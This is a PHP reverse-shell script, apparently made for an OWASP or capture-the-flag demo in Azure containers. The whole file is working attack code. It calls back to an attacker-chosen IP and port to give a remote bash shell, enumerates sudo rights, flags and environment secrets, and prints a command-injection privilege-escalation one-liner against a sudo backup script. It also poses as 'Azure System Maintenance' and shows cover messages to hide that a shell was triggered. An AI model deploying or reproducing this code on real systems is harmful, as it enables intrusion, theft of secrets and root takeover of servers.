<?php
/*
* Azure-Ready PHP Reverse Shell with System Enumeration
* For educational purposes only in Azure Container Instances
* 
* INSTRUCTIONS FOR AZURE DEPLOYMENT:
* 1. Edit the $IP variable below to YOUR public IP address where you'll run netcat
* 2. Set up netcat listener: nc -lvnp 4444
* 3. Upload this file through the web application
* 4. Access the file to trigger the connection
*/

// CONFIGURATION - EDIT THESE VALUES
$IP = 'YOUR_IP_HERE';  // CHANGE THIS to your public IP address where netcat is listening
$PORT = 4444;          // Change this if needed (4444 is default)
$PERFORM_ENUMERATION = true; // Set to false to skip enumeration

// Set timeout to prevent script execution timeout
set_time_limit(0);
ini_set('max_execution_time', 0);

// Function to perform basic system enumeration
function enumerate_system() {
    $results = "
==========================================
        AZURE CONTAINER ENUMERATION
==========================================

";
    
    // Basic system info
    $results .= "[+] Operating System:\n";
    $results .= shell_exec('uname -a') . "\n";
    
    // User info
    $results .= "[+] Current user:\n";
    $results .= shell_exec('id') . "\n";
    
    // Check if we're in a container
    $results .= "[+] Container confirmation:\n";
    $containerCheck = shell_exec('grep -i container /proc/1/cgroup 2>/dev/null || echo "Not in a container"');
    $results .= $containerCheck . "\n";
    
    // Check for sudo rights (key for our privesc)
    $results .= "[+] Sudo rights:\n";
    $sudoCheck = shell_exec('sudo -l 2>/dev/null || echo "Cannot check sudo rights"');
    $results .= $sudoCheck . "\n";
    
    // Search for the backup script specifically
    $results .= "[+] Searching for backup script:\n";
    $backupScript = shell_exec('find /tmp -name "backup_app.sh" 2>/dev/null');
    if (trim($backupScript) != "") {
        $results .= "Found backup script: $backupScript\n";
        $results .= "Content of backup script:\n";
        $results .= shell_exec('cat ' . trim($backupScript)) . "\n";
        
        $results .= "[+] PRIVILEGE ESCALATION VECTOR IDENTIFIED!\n";
        $results .= "You can exploit this using: sudo /tmp/backup_app.sh '; /bin/bash; echo'\n";
    } else {
        $results .= "Backup script not found. Try other privilege escalation vectors.\n";
    }
    
    // Look for flags
    $results .= "[+] Looking for flags:\n";
    $flags = shell_exec('find / -name "*flag*" -type f 2>/dev/null | grep -v "proc\|sys" | head -n 10');
    $results .= $flags . "(showing first 10 results only)\n";
    
    // Check environment variables (may contain secrets)
    $results .= "[+] Checking environment variables:\n";
    $env = shell_exec('env | grep -v "LS_COLORS" | sort');
    $results .= $env . "\n";
    
    $results .= "==========================================\n";
    $results .= "Privilege Escalation Instructions:\n";
    $results .= "1. Run: sudo -l\n";
    $results .= "2. If backup_app.sh is available, run: sudo /tmp/backup_app.sh '; /bin/bash; echo'\n";
    $results .= "3. After getting root, check: cat /root/root_flag.txt\n";
    $results .= "==========================================\n";
    
    return $results;
}

// Function to create a banner
function create_banner() {
    return "
    _____                         _____ __         ____
   /  _  \\_______________________/ ____\\  |__  ____\\___ \\
   /  /_\\  \\_  __ \\_  __ \\___   /   __\\|  |  \\/  _ \\|  \\ \\
  /    |    \\  | \\/|  | \\//    /\\  |   |   Y  (  <_> )  \\_\\
  \\____|__  /__|   |__|  /_____ \\__|   |___|  /\\____/|___  /
          \\/              \\/                \\/           \\/
    
    Azure-Ready Reverse Shell for OWASP Demo
    ";
}

// Display a web-based interface if accessed via browser
if (php_sapi_name() !== 'cli') {
    echo "<html><head><title>Azure System Maintenance</title>";
    echo "<style>body{background:#000;color:#2F8;font-family:monospace;font-size:14px;margin:20px;}</style></head>";
    echo "<body><pre>" . create_banner() . "\n\nConnecting to management server at $IP:$PORT...</pre>";
    echo "<script>document.body.innerHTML += 'Running system diagnostics...<br>';</script>";
    flush();
    ob_flush();
}

// Perform system enumeration if enabled
if ($PERFORM_ENUMERATION) {
    $enumeration_results = enumerate_system();
    
    if (php_sapi_name() !== 'cli') {
        echo "<pre>" . htmlspecialchars($enumeration_results) . "</pre>";
        echo "<script>document.body.innerHTML += 'Establishing secure connection...<br>';</script>";
        flush();
        ob_flush();
    }
}

// Create a socket connection to the attacker machine
$sock = fsockopen($IP, $PORT, $errno, $errstr, 30);
if (!$sock) {
    if (php_sapi_name() !== 'cli') {
        echo "<pre>Error: Could not connect to management server ($errno): $errstr</pre>";
        echo "<pre>Make sure you changed the IP address to your public IP and are running a netcat listener!</pre>";
        echo "</body></html>";
    }
    exit(1);
}

// Prepare a message to send when connection established
$initMessage = create_banner();
$initMessage .= "\n[+] Connected to reverse shell from " . $_SERVER['SERVER_ADDR'] . " (" . php_uname() . ")\n";
$initMessage .= "[+] Web Server User: " . shell_exec('id') . "\n";
$initMessage .= "[+] Current Path: " . getcwd() . "\n\n";

if ($PERFORM_ENUMERATION) {
    $initMessage .= $enumeration_results;
}

// Send the initial message over the connection
fwrite($sock, $initMessage);

// Set up the shell
$descriptors = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

// Start the process with the shell specified
$process = proc_open('/bin/bash', $descriptors, $pipes);

if (!is_resource($process)) {
    // Try /bin/sh if /bin/bash fails
    $process = proc_open('/bin/sh', $descriptors, $pipes);
    fwrite($sock, "[!] Fallback to /bin/sh\n");
}

if (is_resource($process)) {
    // Set streams as non-blocking
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    
    fwrite($sock, "[*] Shell session established\n\n");
    fwrite($sock, "Try the privilege escalation command: sudo /tmp/backup_app.sh '; /bin/bash; echo'\n\n");
    
    // Loop to maintain the shell
    while (true) {
        // Check if connection is still alive
        if (feof($sock)) {
            break;
        }
        
        $read = array($sock, $pipes[1], $pipes[2]);
        $write = null;
        $except = null;
        
        // Wait for data to be available (with a timeout)
        if (stream_select($read, $write, $except, null) > 0) {
            // Handle data from socket (user commands)
            if (in_array($sock, $read)) {
                $input = fread($sock, 1024);
                if (strlen($input) == 0) {
                    break;
                }
                fwrite($pipes[0], $input);
            }
            
            // Handle stdout from process
            if (in_array($pipes[1], $read)) {
                $output = fread($pipes[1], 1024);
                if (strlen($output) > 0) {
                    fwrite($sock, $output);
                }
            }
            
            // Handle stderr from process
            if (in_array($pipes[2], $read)) {
                $error = fread($pipes[2], 1024);
                if (strlen($error) > 0) {
                    fwrite($sock, $error);
                }
            }
        }
    }
    
    // Clean up
    proc_close($process);
}

// Close socket connection
fclose($sock);

// Display a message if accessed via browser to hide the fact that a shell was triggered
if (php_sapi_name() !== 'cli') {
    echo "<script>document.body.innerHTML += 'Maintenance completed. You may close this window.<br>';</script>";
    echo "</body></html>";
}
?> 